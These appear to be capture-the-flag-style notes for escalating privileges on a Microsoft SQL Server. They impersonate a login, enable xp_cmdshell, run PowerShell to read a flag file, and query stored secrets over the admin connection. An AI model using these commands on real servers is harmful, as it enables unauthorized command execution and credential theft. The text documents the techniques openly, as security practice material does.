# connect 
$ComputerName = $Env:computername
$SqlInstances = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server' -Name InstalledInstances).InstalledInstances

# version
sqlcmd -C -E -Q "Select @@version"

# Microsoft SQL Server 2025 (RTM) - 17.0.1000.7 (X64) Oct 21 2025 12:05:57 Copyright (C) 2025 Microsoft Corporation Enterprise Developer Edition (64-bit) on Windows 10 Pro 10.0 <X64> (Build 26100: ) (Hypervisor)

# usage: Sqlcmd           
#  [-E trusted connection]
#  [-C Trust Server Certificate]
#  [-Q "cmdline query" and exit]

# show database 
sqlcmd -C -E -Q "SELECT name FROM sys.databases;"

# show tables
sqlcmd -C -E -Q "USE msdb;SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'"


  
# check user is admin
SELECT SYSTEM_USER, ORIGINAL_LOGIN(), IS_SRVROLEMEMBER('sysadmin');

# SQL Login Impersonation
EXECUTE AS LOGIN = 'svc_reports'; SELECT SYSTEM_USER, ORIGINAL_LOGIN(), IS_SRVROLEMEMBER('sysadmin');

# turn on xp_cmdshell
EXECUTE AS LOGIN='svc_reports';
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;         RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# run xp_cmdshell
EXECUTE AS LOGIN='svc_reports' EXEC xp_cmdshell 'powershell -c "type C:\Users\svc_sql\Desktop\user.txt"';

# quote
EXECUTE AS LOGIN='svc_reports' EXEC xp_cmdshell 'powershell -c "$aaa=\"123\";$aaa;"';


# Notice Server must be specific , but this permision is still different with DAC, this is very weild
sqlcmd -C -E -S "ADMIN:UNCLAIMED" -Q "SELECT * FROM master.sys.sysobjvalues WHERE valclass = 28;"